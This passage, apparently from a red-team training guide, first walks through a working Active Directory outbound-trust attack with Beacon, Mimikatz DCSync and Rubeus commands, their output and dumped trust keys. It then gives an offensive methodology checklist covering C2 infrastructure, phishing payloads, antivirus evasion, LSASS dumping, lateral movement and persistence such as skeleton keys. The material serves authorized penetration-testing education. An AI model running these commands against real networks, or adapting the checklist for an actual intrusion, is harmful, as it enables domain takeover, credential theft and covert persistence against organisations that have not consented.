15.27 Outbound Trusts

An adversary may land on the "wrong" side of a one-way trust — the trusting side. They sit against the direction of access and cannot reach resources in the trusted domain by design (forest trusts are official security boundaries). The TDO below shows the outbound side of a one-way trust with contoso.com:

beacon> getuid
[*] You are PARTNER\vwebber

beacon> ldapsearch (objectClass=trustedDomain)

name: contoso.com
trustDirection: 2
trustAttributes: 8
flatName: CONTOSO

Enumerating the foreign domain fails with error code 49 (invalid credentials) — basic enumeration is impossible without credential material:

beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com

Binding to contoso.com
[-] Bind Failed: 49

Under the hood, a TGS-REQ for krbtgt/CONTOSO.COM hits the partner.com KDC, which returns KDC_ERR_S_PRINCIPAL_UNKNOWN — the target server is not in the KDC's database, and the outbound side performs no referral. With credential material for a principal in the trusted domain, however, impersonation works directly:

beacon> make_token CONTOSO\Administrator Passw0rd!
[+] Impersonated CONTOSO\Administrator (netonly)

beacon> ls \\lon-dc-1.contoso.com\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     01/24/2025 13:33:39   $Recycle.Bin
          dir     01/23/2025 13:57:51   $WinREAgent
          dir     01/23/2025 13:47:37   Documents and Settings
          dir     05/08/2021 09:20:24   PerfLogs
          dir     03/18/2025 13:18:21   Program Files
          dir     01/23/2025 15:46:18   Program Files (x86)
          dir     03/18/2025 13:18:02   ProgramData
          dir     01/23/2025 13:47:43   Recovery
          dir     01/29/2025 10:42:20   System Volume Information
          dir     01/24/2025 13:33:21   Users
          dir     01/24/2025 13:49:56   Windows
 12kb     fil     03/18/2025 05:28:14   DumpStack.log.tmp
 1gb      fil     03/18/2025 05:28:14   pagefile.sys

The calling client performs ticket exchanges directly with the trusted domain's KDC. The exploitable credential is the trust account — its password is the shared inter-realm key, a copy of which is stored in the trusting domain's TDO. To extract the key, start by reading the TDO's objectGUID:

beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

--------------------
name: contoso.com
objectGUID: 288d9ee6-2b3c-42aa-bef8-959ab4e484ed

Then DCSync the TDO via Mimikatz's /guid parameter:

beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}

[DC] 'partner.com' will be the domain
[DC] 'par-dc-1.partner.com' will be the DC server
[DC] Object with GUID '{288d9ee6-2b3c-42aa-bef8-959ab4e484ed}'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)

Object RDN           : contoso.com

** TRUSTED DOMAIN - Antisocial **

Partner              : contoso.com
 [ Out ] CONTOSO.COM -> PARTNER.COM
    * 14/03/2025 10:27:30 - CLEAR   - cb 87 71 2c 62 c1 2e 70 ae d8 29 5e 6a ae 8c a9 96 39 51 39 10 3a ef 7c 42 6d 2d 97 
	* aes256_hmac       cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
	* aes128_hmac       4929a44176077b570d1b6f1eae4f9fbb
	* rc4_hmac_nt       6150491cceb080dffeaaec5e60d8f58d

 [Out-1] CONTOSO.COM -> PARTNER.COM
    * 14/03/2025 10:27:30 - CLEAR   - cb 87 71 2c 62 c1 2e 70 ae d8 29 5e 6a ae 8c a9 96 39 51 39 10 3a ef 7c 42 6d 2d 97 
	* aes256_hmac       cc19dd9022fb33da79820c340e7c96765f237aa1a5a9dfe889a8f27af12c7a34
	* aes128_hmac       4929a44176077b570d1b6f1eae4f9fbb
	* rc4_hmac_nt       6150491cceb080dffeaaec5e60d8f58d

[Out] and [Out-1] are the current and previous keys. They match here because 30 days haven't elapsed since trust creation. With the RC4 key, request a TGT from the trusted domain:

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 6150491cceb080dffeaaec5e60d8f58d
[*] Building AS-REQ (w/ preauth) for: 'CONTOSO.COM\PARTNER$'
[*] Using domain controller: 10.10.120.1:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFZ[...snip...]kNPTQ==

  ServiceName              :  krbtgt/CONTOSO.COM
  ServiceRealm             :  CONTOSO.COM
  UserName                 :  PARTNER$ (NT_PRINCIPAL)
  UserRealm                :  CONTOSO.COM
  StartTime                :  18/03/2025 13:58:52
  EndTime                  :  18/03/2025 23:58:52
  RenewTill                :  25/03/2025 13:58:52
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  dwwauTnm1s6wRz0YxKmFTQ==
  ASREP (key)              :  6150491CCEB080DFFEAAEC5E60D8F58D

Inject the ticket into a logon session and the trusted domain becomes enumerable:

beacon> run klist

Current LogonId is 0:0x23da426

Cached Tickets: (2)

#0>	Client: PARTNER$ @ CONTOSO.COM
	Server: krbtgt/CONTOSO.COM @ CONTOSO.COM
	KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
	Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize 
	Start Time: 3/18/2025 13:58:52 (local)
	End Time:   3/18/2025 23:58:52 (local)
	Renew Time: 3/25/2025 13:58:52 (local)
	Session Key Type: RSADSI RC4-HMAC(NT)
	Cache Flags: 0x1 -> PRIMARY 
	Kdc Called: 

beacon> ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com

Binding to contoso.com

[*] Distinguished name: DC=contoso,DC=com
[*] Filter: (objectClass=domain)
[*] Scope of search value: 3
[*] Returning specific attribute(s): name,objectSid

--------------------
name: contoso
objectSid: S-1-5-21-3926355307-1661546229-813047887
retreived 1 results total

This works because the trust account's primaryGroupID is 513 — implicitly granting Domain Users privileges without explicit group membership (a legacy POSIX support behaviour). From here, enumerate the trusted domain for roastable accounts, ADCS misconfigurations, and other vulnerabilities.

16. Methodology

16.1 C2 Infrastructure

  • Stand up the team server on a hardened VPS; restrict SSH and team-server ports to the operator network only
  • Pick a Malleable C2 profile that mimics a plausible traffic pattern for the target environment (CDN, SaaS, software update)
  • Deploy at least one HTTP(S) redirector (Apache/NGINX) in front of the team server; rotate the upstream URL between engagements
  • Categorize the redirector domain through the target's web filter (aged domains, sensible category, valid TLS cert)
  • Issue a publicly-trusted TLS certificate (Let's Encrypt) and set HSTS so traffic blends with normal HTTPS
  • Add a separate DNS C2 channel as a fallback — different domain, different name servers
  • Capture and review a full session of Beacon traffic to make sure the profile renders as expected before live use
  • Lock down the Cobalt Strike team server: strong shared password, fail2ban, current build, signed artifacts

16.2 OSINT & External Recon

  • Gather user names, email format, and org structure from LinkedIn and breach data for phishing and password spraying
  • Identify the target's email gateway, EDR vendor, and remote-access stack (Citrix, VPN, RDS) from job posts and HTTP banners
  • Enumerate external DNS, MX records, and SPF/DMARC posture; pick a sending domain that won't be blocked
  • Hunt for exposed cloud assets (S3, Azure blobs, public Github repos) leaking credentials or config
  • Build a believable pretext and lure aligned to the target's industry and current events

16.3 Initial Access

  • Build a stageless payload (HTA, LNK, ISO container, Office macro) tailored to bypass the identified mail gateway
  • Customize the Arsenal Kit: artifact, resource, sleep mask, UDRL, and Malleable C2 sleep/jitter together
  • Test the artifact against Defender / AMSI locally (DefenderCheck / ThreatCheck / AMSITrigger) and fix every flagged byte
  • Strip Mark-of-the-Web from the delivery container (ISO/IMG/VHDX wrapping)
  • Choose the delivery channel (HTTPS link, password-protected archive, Teams/Slack DM) that the target's filters allow
  • Pick a believable spawnto process for the post-ex stack; include realistic command-line arguments
  • Catch the first callback, confirm user / host / integrity / OS / EDR, snapshot the env before doing anything noisy

16.4 Host Reconnaissance & Situational Awareness

  • whoami /all, integrity level, group memberships, privileges
  • Run Seatbelt / WinPEAS via inline-execute or BOF; triage the most interesting findings first
  • Identify the EDR/AV product, its drivers, and any user-mode hooks loaded into the current process
  • Confirm AMSI / Constrained Language Mode / Defender ASR posture before running PowerShell
  • Map adjacent hosts, internal DNS, and accessible shares (net view, arp -a, BloodHound collector)
  • Search the Credential Manager, DPAPI, registry, browser stores, and Sticky-Notes for stashed creds

16.5 Local Privilege Escalation

  • Bypass UAC where the user is a local admin (fodhelper, computerdefaults, CMSTP UAC variant)
  • Enumerate token privileges (SeImpersonate, SeAssignPrimaryToken, SeBackup) and abuse the strongest one (Potato family)
  • Hunt unquoted service paths, weak DACLs on services, weak DACLs on service binaries
  • Check installed software for known local-priv bugs (vulnerable drivers, KMS server tools, etc.)
  • Search startup folders, registry Run keys, and scheduled tasks for writable elevated targets
  • Identify DLL search-order hijack candidates in privileged processes

16.6 Credential Access

  • Dump LSASS via the stealthiest viable path (comsvcs MiniDump, NanoDump, process-clone) and parse offline
  • Pull SAM + SYSTEM + SECURITY hives and parse offline with secretsdump for local + cached creds
  • Decrypt DPAPI vaults (browser, RDP, Wi-Fi, mapped drive creds) using the user or domain backup key
  • Kerberoast SPN-bearing accounts; AS-REP roast accounts without pre-auth; crack offline
  • Read LAPS passwords for any computer object the foothold is authorized on
  • Pull gMSA passwords where allowed (ReadGMSAPassword)
  • Spray validated cred patterns carefully against the lockout policy

16.7 Lateral Movement

  • Pass-the-Hash / Overpass-the-Hash to reach hosts that share the local admin password
  • Pass-the-Ticket (Rubeus) using stolen TGTs or freshly-asktgs'd service tickets
  • WMI (jump wmi / remote-exec wmi) for stealthy execution where SMB is monitored
  • WinRM (jump winrm) when SMB is blocked but 5985/5986 is open
  • Service-creation (jump psexec64) only when noisy paths are tolerable; prefer SCShell-style alternatives
  • DCOM (MMC20.Application, ShellWindows) as an alternative to SMB-based execution
  • Restricted-admin RDP with a hash where interactive context is needed
  • Hunt privileged user sessions and impersonate their tokens instead of re-authenticating

16.8 Active Directory Exploitation

  • Run BloodHound; pick the shortest path to Tier 0 and review each edge's risk
  • Abuse writable ACLs (GenericAll, WriteDACL, WriteOwner, GenericWrite) to take over user/computer objects
  • Abuse unconstrained, constrained, and resource-based constrained delegation (RBCD) to reach high-value targets
  • Hunt vulnerable ADCS templates (ESC1–ESC15); enroll for a high-priv certificate
  • Coerce authentication (PetitPotam, PrinterBug, ShadowCoerce) and relay to LDAP/ADCS
  • DCSync the krbtgt and target accounts once domain admin is reached
  • Forge Golden / Silver / Diamond tickets for persistence and targeted access
  • Enumerate and abuse forest/external/parent-child trusts (SID-history, trust-key Kerberoasting, foreign group membership)

16.9 MS SQL Server

  • Discover SQL instances via SPNs, UDP 1434 browser, and BloodHound; capture computer / domain auth as the SQL service
  • Enumerate EXECUTE AS / IMPERSONATE chains to reach sysadmin without a password
  • Use xp_cmdshell for command execution; fall back to sp_OACreate or CLR assemblies when disabled
  • Abuse linked servers to pivot to additional SQL instances or domains
  • Coerce SQL service authentication and relay to LDAP / SMB / additional SQL hosts

16.10 Persistence

  • Establish per-user persistence (Run keys, Startup folder, scheduled tasks) sized to engagement tolerance
  • Service / driver persistence for elevated long-lived access
  • WMI event subscription for fileless triggered execution
  • COM hijacking against a writable user-hive CLSID
  • DC-side persistence (DSRM, AdminSDHolder, ACL backdoor, skeleton key) reserved for stated objectives
  • Catalog every artifact installed so cleanup at end of engagement is complete
